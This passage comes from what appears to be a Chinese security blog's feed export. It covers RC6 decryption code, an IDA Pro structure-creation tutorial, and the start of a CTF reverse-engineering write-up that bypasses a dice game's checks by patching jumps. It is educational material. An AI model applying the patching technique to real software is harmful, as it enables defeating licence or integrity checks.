(ct[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解密算法-2"><a href="#解密算法-2" class="headerlink" title="解密算法"></a>解密算法</h2><p>解密过程同样是加密过程的逆运算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc6_decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *cipher, <span class="keyword">unsigned</span> <span class="keyword">char</span> *plain)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WORD pt[<span class="number">4</span>], ct[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ct[i] = cipher[<span class="number">4</span> * i] + (cipher[<span class="number">4</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + (cipher[<span class="number">4</span> * i + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (cipher[<span class="number">4</span> * i + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WORD A, B, C, D, t, u, x;</span><br><span class="line"></span><br><span class="line">    A = ct[<span class="number">0</span>];</span><br><span class="line">    B = ct[<span class="number">1</span>];</span><br><span class="line">    C = ct[<span class="number">2</span>];</span><br><span class="line">    D = ct[<span class="number">3</span>];</span><br><span class="line">    C -= S[<span class="number">2</span> * r + <span class="number">3</span>];</span><br><span class="line">    A -= S[<span class="number">2</span> * r + <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span> * r; i &gt;= <span class="number">2</span>; i -= <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x = D;</span><br><span class="line">        D = C;</span><br><span class="line">        C = B;</span><br><span class="line">        B = A;</span><br><span class="line">        A = x;</span><br><span class="line">        u = ROTL(D * (<span class="number">2</span> * D + <span class="number">1</span>), lgw);</span><br><span class="line">        t = ROTL(B * (<span class="number">2</span> * B + <span class="number">1</span>), lgw);</span><br><span class="line">        C = ROTR(C - S[i + <span class="number">1</span>], t) ^ u;</span><br><span class="line">        A = ROTR(A - S[i], u) ^ t;</span><br><span class="line">    &#125;</span><br><span class="line">    D -= S[<span class="number">1</span>];</span><br><span class="line">    B -= S[<span class="number">0</span>];</span><br><span class="line">    pt[<span class="number">0</span>] = A;</span><br><span class="line">    pt[<span class="number">1</span>] = B;</span><br><span class="line">    pt[<span class="number">2</span>] = C;</span><br><span class="line">    pt[<span class="number">3</span>] = D;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        plain[<span class="number">4</span> * i] = pt[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        plain[<span class="number">4</span> * i + <span class="number">1</span>] = (pt[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        plain[<span class="number">4</span> * i + <span class="number">2</span>] = (pt[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        plain[<span class="number">4</span> * i + <span class="number">3</span>] = (pt[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://en.wikipedia.org/wiki/RC_algorithm" target="_blank" rel="noopener">RC_algorithm</a><br><a href="https://www.ripublication.com/irph/ijict_spl/ijictv4n17spl_13.pdf" target="_blank" rel="noopener">A Comparative Study of Rivest Cipher Algorithms</a><br><a href="http://113.209.194.153/ds_pdf/13711077.pdf" target="_blank" rel="noopener">现代密码学教程</a><br><a href="https://tools.ietf.org/pdf/rfc2268.pdf" target="_blank" rel="noopener">A Description of the RC2(r) Encryption Algorithm</a><br><a href="http://people.csail.mit.edu/rivest/Rivest-rc5rev.pdf" target="_blank" rel="noopener">The RC5 Encryption Algorithm</a><br><a href="http://people.csail.mit.edu/rivest/pubs/RRSY98.pdf" target="_blank" rel="noopener">The RC6 Block Cipher</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RC 算法是由 Ron Rivest 发明的一系列对称密钥加密算法。虽然这一系列的算法名字相似，但实际上算法之间没有太大的关联。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="c" scheme="https://qianfei11.github.io/tags/c/"/>
    
      <category term="crypto" scheme="https://qianfei11.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>如何使用IDA创建结构体</title>
    <link href="https://qianfei11.github.io/2019/09/01/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8IDA%E5%88%9B%E5%BB%BA%E7%BB%93%E6%9E%84%E4%BD%93/"/>
    <id>https://qianfei11.github.io/2019/09/01/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8IDA%E5%88%9B%E5%BB%BA%E7%BB%93%E6%9E%84%E4%BD%93/</id>
    <published>2019-09-01T03:16:02.000Z</published>
    <updated>2019-09-01T08:07:29.727Z</updated>
    
    <content type="html"><![CDATA[<p>IDA 无法直接反编译出程序所构造的结构体，但我们可以通过观察伪代码来判断并在 IDA 中创建结构体</p><a id="more"></a><h1 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h1><p>源码摘自菜鸟教程的 C 语言教程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Books</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">char</span>  title[<span class="number">10</span>];</span><br><span class="line">   <span class="keyword">char</span>  author[<span class="number">10</span>];</span><br><span class="line">   <span class="keyword">char</span>  subject[<span class="number">20</span>];</span><br><span class="line">   <span class="keyword">int</span>   book_id;</span><br><span class="line">&#125; book = &#123;<span class="string">"C 语言"</span>, <span class="string">"RUNOOB"</span>, <span class="string">"编程语言"</span>, <span class="number">123456</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"title : %s\nauthor: %s\nsubject: %s\nbook_id: %d\n"</span>, book.title, book.author, book.subject, book.book_id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><p>在 IDA 中 f5 反编译后得到的结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"title : %s\nauthor: %s\nsubject: %s\nbook_id: %d\n"</span>,</span><br><span class="line">    &amp;book,</span><br><span class="line">    (<span class="keyword">char</span> *)&amp;book + <span class="number">10</span>,</span><br><span class="line">    (<span class="keyword">char</span> *)&amp;book + <span class="number">20</span>,</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_100001040);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 IDA 并不能解析出我们构造的结构体。IDA 之所以在分析阶段无法识别结构体，可能源于两个原因。</p><ol><li>首先，虽然 IDA 了解某个结构体的布局，但它并没有足够的信息，能够判断程序确实使用了结构体。</li><li>其次，程序中的结构体可能是一种 IDA 对其一无所知的非标准结构体。</li></ol><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>关于结构体我们所会使用的主要操作包括添加、删除和编辑结构体。首先打开 Structures（结构体）窗口，使用热键 INSERT 打开 Creat Structure/Union（创建结构体/联合）对话框。</p><p><img src="/pics/如何使用IDA创建结构体/1.png" alt="Creat Structure/Union（创建结构体/联合）对话框"></p><p>为了创建一个新的结构体，必须首先在 Structure name（结构体名称）输入框中指定结构体的名称。前两个复选框用于决定新结构体在结构体窗口中的显示位置，或者是否在窗口中显示新结构体。第三个复选框 Creat union（创建联合），指定你定义的是否为 C 风格联合结构体。结构体的大小是它所包含的字段大小的总和，而联合的大小则等于其中最大字段的大小。Add standard structure（添加标准结构体）按钮用于访问 IDA 当前能够识别的全部结构体数据类型。指定结构体的名称并单击 OK 后，IDA 将在结构体窗口中创建一个空结构体定义。</p><p><img src="/pics/如何使用IDA创建结构体/2.png" alt="空结构体"></p><p>为了给新结构体添加字段，必须利用字段创建命令 D、A 和数字键盘上的星号键(*)。D 命令的行为非常依赖于光标的位置，建议采用下面的步骤给结构体添加字段。</p><ol><li>首先将光标放在结构体定义的最后一行（包含 ends 的那一行）并按下 D 键。这时，IDA 就会在结构体的末尾添加一个新字段。新字段的大小取决于你在数据转盘上选择的第一个大小。最初，字段的名称为 field_N，这里的 N 为结构体开头到新字段(如 field_0)开头的数字偏移量。</li><li>如果需要修改字段的大小，首先将光标放在新字段的名称上，然后重复按下 D 键，使数据转盘上的数据类型开始循环，从而为新字段选择正确的数据大小。另外，你还可以使用 Options ► Setup Data Types 来指定一个在数据转盘上不存在的大小。如果新字段是一个数组，右击其名称并在上下文菜单中选择 Array，将打开“数组规范”对话框。</li><li>要更改一个结构体字段的名称，单击字段名称并按下 N 键，或者右击该名称并在上下文菜单中选择 Name，然后在输入框中输入一个名称即可。</li></ol><p>根据以上步骤，可以构造如下结构体。</p><p><img src="/pics/如何使用IDA创建结构体/3.png" alt="含有四个变量的结构体"></p><p>在定义自己的结构体时，下面的提示可能会有所帮助。</p><ol><li>一个字段的字节偏移量以一个 8 位十六进制值在结构体窗口的左侧显示。</li><li>每次你添加或删除一个结构体字段，或更改一个现有字段的大小，结构体的新 sizeof 大小都会在结构体定义的第一行反映出来。</li><li>可以给一个结构体字段添加注释，就像给任何反汇编行添加注释一样。右击（或使用热键）希望为其添加注释的字段，在上下文菜单中选择一个注释选项即可。</li><li>与结构体窗口顶部的说明不同的是，只有当一个字段是结构体中的最后一个字段时，使用 U 键才能删除该字段。对于所有其他字段，按下 U 键将取消该字段的定义，这样做仅仅删除了该字段的名称，并没有删除分配给该字段的字节。</li><li>必须对一个结构体定义中的所有字段进行适当的对齐。IDA 并不区分已压缩和未压缩的结构体。为将字段适当对齐，如需要填补字节，那么必须负责添加这些字节。填补字节最好作为适当大小的哑字段添加。在添加额外的字段后，可以选择取消或保留这些字段的定义。</li><li>分配到结构体中间的字节只有在取消关联字段的定义后才能删除，使用 Edit ► Shrink Struct Type（缩小结构体类型）即可删除被取消定义的字节。</li><li>可以在结构体的中间添加新的字节：选择新字节后面的一个字段，然后使用 Edit ► Expand Struct Type（扩大结构体类型）在选中的字段前插入一定数量的字节。</li><li>如果知道结构体的大小，而不了解它的布局，就需要创建两个字段。第一个字段为一个数组，它的大小为结构体的大小减去 1 个字节(size-1)；第二个字段应为 1 个字节。创建第二个字段后，取消第一个（数组）字段的定义。这样，结构体的大小被保留下来，随后，当进一步了解该结构体的布局后，可以回过头来定义它的字段及其大小。</li></ol><p>通过重复应用这些步骤（添加字段、设置字段大小、添加填补字节等），就可以在 IDA 中创建一个 Books 结构体。</p><p><img src="/pics/如何使用IDA创建结构体/4.png" alt="最终的结构体信息"></p><p>重新给变量设置数据类型为 Book，得到如下结果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"title : %s\nauthor: %s\nsubject: %s\nbook_id: %d\n"</span>, &amp;book, &amp;book.gap1[<span class="number">9</span>], &amp;book.gapC[<span class="number">8</span>], unk_100001040);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一种方法是直接导入新的结构体。IDA 能够解析 C（而非 C++）数据声明，以及整个 C 头文件，并自动为在这些声明或头文件中定义的结构体创建对应的 IDA 结构体。如果碰巧有正在进行逆向的二进制文件的源代码，或者头文件，那么就可以让 IDA 直接从源代码中提取出相关结构体，从而节省大量时间。</p><p>IDA 5.2 版引入了 “本地类型” 子窗口，使用 View ► OpenSubviews ► Local Types（查看 ► 打开子窗口 ► 本地类型）打开该窗口，其中列出了所有解析到当前数据库中的类型。新数据库的“本地类型”窗口最初是空的，但是，该窗口能够通过 INSERT 键或上下文菜单中的 Insert 选项解析新的类型。</p><p><img src="/pics/如何使用IDA创建结构体/5.png" alt="直接导入结构体"></p><p>解析新类型时发生的错误将在 IDA 的消息窗口中显示。如果类型声明被成功解析，“本地类型” 窗口将列出该类型及其相关声明。可以看到先前在 Structures 窗口添加的结构体和刚才直接导入的结构体信息。</p><p><img src="/pics/如何使用IDA创建结构体/6.png" alt="结构体信息"></p><p>重新设置变量的数据类型为 Book2，可以得到一个完美的结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"title : %s\nauthor: %s\nsubject: %s\nbook_id: %d\n"</span>,</span><br><span class="line">    &amp;book,</span><br><span class="line">    book.author,</span><br><span class="line">    book.subject,</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">int</span>)book.book_id);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://www.idabook.com/" target="_blank" rel="noopener">The IDA Pro Book</a><br><a href="https://www.runoob.com/cprogramming/c-structures.html" target="_blank" rel="noopener">https://www.runoob.com/cprogramming/c-structures.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;IDA 无法直接反编译出程序所构造的结构体，但我们可以通过观察伪代码来判断并在 IDA 中创建结构体&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>杭电CTF-题库-reverse</title>
    <link href="https://qianfei11.github.io/2019/08/24/%E6%9D%AD%E7%94%B5CTF-%E9%A2%98%E5%BA%93-reverse/"/>
    <id>https://qianfei11.github.io/2019/08/24/%E6%9D%AD%E7%94%B5CTF-%E9%A2%98%E5%BA%93-reverse/</id>
    <published>2019-08-24T03:33:30.000Z</published>
    <updated>2019-08-28T05:01:31.376Z</updated>
    
    <content type="html"><![CDATA[<p>在杭电的平台上做了几道题。</p><a id="more"></a><h1 id="ebCTF-Teaser-BIN100-Dice"><a href="#ebCTF-Teaser-BIN100-Dice" class="headerlink" title="ebCTF-Teaser-BIN100-Dice"></a>ebCTF-Teaser-BIN100-Dice</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file ebCTF-Teaser-BIN100-Dice.exe</span><br><span class="line">ebCTF-Teaser-BIN100-Dice.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows</span><br></pre></td></tr></table></figure><p>拖进 OD，搜索字符串：</p><p><img src="/pics/杭电CTF-题库-reverse/1.png" alt="搜索字符串"></p><p>大概可以看出是一个摇骰子的游戏，如果全部正确就能得到 flag。最直接的想法就是用 OD 边调试边修改寄存器的值，最后就能得到 flag：</p><p><img src="/pics/杭电CTF-题库-reverse/2.png" alt="修改关键内存的值"></p><p>更方便的方式是直接在 IDA 里把所有判断不正确的跳转 patch 掉，这样就能直接得到结果：</p><p><img src="/pics/杭电CTF-题库-reverse/3.png" alt="得到flag"></p><p>也可以在 IDA 里直接逆，关键部分代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">          <span class="keyword">if</span> ( v82 == <span class="number">7</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            fctx.call_site = <span class="number">1</span>;</span><br><span class="line">            v43 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">                    (<span class="keyword">int</span>)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">                    <span class="string">"[*] You rolled a seven, with a six sided dice! How awesome are you?!"</span>);</span><br><span class="line">            v44 = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v43, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">            <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v44, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">            v85 *= <span class="number">2</span>;</span><br><span class="line">            v85 *= <span class="number">50</span>;</span><br><span class="line">            v85 /= <span class="number">50</span>;</span><br><span class="line">            v85 += <span class="number">65</span>;</span><br><span class="line">            v85 -= <span class="number">65</span>;</span><br><span class="line">            v85 *= <span class="number">42</span>;</span><br><span class="line">            v85 /= <span class="number">42</span>;</span><br><span class="line">            v49 = time(<span class="number">0</span>);</span><br><span class="line">            v79 = v49;</span><br><span class="line">            v81 = v49 - v80;</span><br><span class="line">            <span class="keyword">if</span> ( v49 - v80 &gt; <span class="number">2</span> )</span><br><span class="line">              v85 *= <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">            &#123;</span><br><span class="line">              fctx.call_site = <span class="number">1</span>;</span><br><span class="line">              v50 = <span class="built_in">std</span>::<span class="built_in">string</span>::size((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v87);</span><br><span class="line">              <span class="keyword">if</span> ( i &gt;= v50 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v51 = (_BYTE *)<span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>[]((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v87, i);</span><br><span class="line">              *v51 ^= v85;</span><br><span class="line">            &#125;</span><br><span class="line">            i = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">            &#123;</span><br><span class="line">              fctx.call_site = <span class="number">1</span>;</span><br><span class="line">              v52 = <span class="built_in">std</span>::<span class="built_in">string</span>::size((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v84);</span><br><span class="line">              <span class="keyword">if</span> ( j &gt;= v52 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v64 = (_BYTE *)<span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>[]((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v84, j);</span><br><span class="line">              v53 = (_BYTE *)<span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>[]((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v87, i);</span><br><span class="line">              *v64 ^= *v53;</span><br><span class="line">              ++i;</span><br><span class="line">              v54 = <span class="built_in">std</span>::<span class="built_in">string</span>::length((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v87);</span><br><span class="line">              <span class="keyword">if</span> ( i &gt;= v54 )</span><br><span class="line">                i = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            fctx.call_site = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">std</span>::<span class="built_in">string</span>::find((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v84, <span class="string">"ebCTF"</span>, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              fctx.call_site = <span class="number">1</span>;</span><br><span class="line">              v59 = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">              v60 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">                      v59,</span><br><span class="line">                      <span class="string">"[!] It seems you did something wrong :( No flag for you."</span>);</span><br><span class="line">              v61 = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v60, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">              <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v61, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">              fctx.call_site = <span class="number">3</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v72);</span><br><span class="line">              fctx.call_site = <span class="number">5</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v73);</span><br><span class="line">              fctx.call_site = <span class="number">7</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v74);</span><br><span class="line">              fctx.call_site = <span class="number">9</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v75);</span><br><span class="line">              fctx.call_site = <span class="number">11</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v76);</span><br><span class="line">              fctx.call_site = <span class="number">13</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v77);</span><br><span class="line">              fctx.call_site = <span class="number">15</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v78);</span><br><span class="line">              fctx.call_site = <span class="number">16</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v83);</span><br><span class="line">              fctx.call_site = <span class="number">17</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v84);</span><br><span class="line">              fctx.call_site = <span class="number">-1</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v87);</span><br><span class="line">              v65 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v55 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">                      (<span class="keyword">int</span>)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">                      <span class="string">"[*] You rolled 3-1-3-3-7, what does that make you? ELEET! \\o/"</span>);</span><br><span class="line">              <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v55, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span 